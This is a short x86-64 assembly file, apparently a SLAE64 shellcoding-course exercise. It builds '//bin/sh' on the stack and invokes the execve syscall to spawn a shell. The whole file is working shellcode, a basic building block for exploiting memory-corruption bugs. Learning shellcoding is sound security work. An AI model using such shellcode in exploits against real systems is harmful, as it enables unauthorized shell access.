; Filename: execve-nasm.nasm
; Author:  SLAE64 - 1525
;
; Purpose: execute /bin/sh
BITS 64

global _start

section .text

; settings
SH equ 0x68732f6e69622f2f

; syscall kernel opcodes
SYS_EXECVE equ 0x3b

_start:
    xor rax, rax
    push rax
    pop rdx         
    push rdx
    mov rbx, SH ; build //bin/sh
    push rbx ; copy ¨//bin/sh¨ string to stack
    mov rdi, rsp ; get the address for /bin/sh string
    push rax ; build args array, by pushing NULL
    push rdi ; then pushing string address
    mov rsi, rsp ; args array address
	push SYS_EXECVE
    pop rax
    syscall
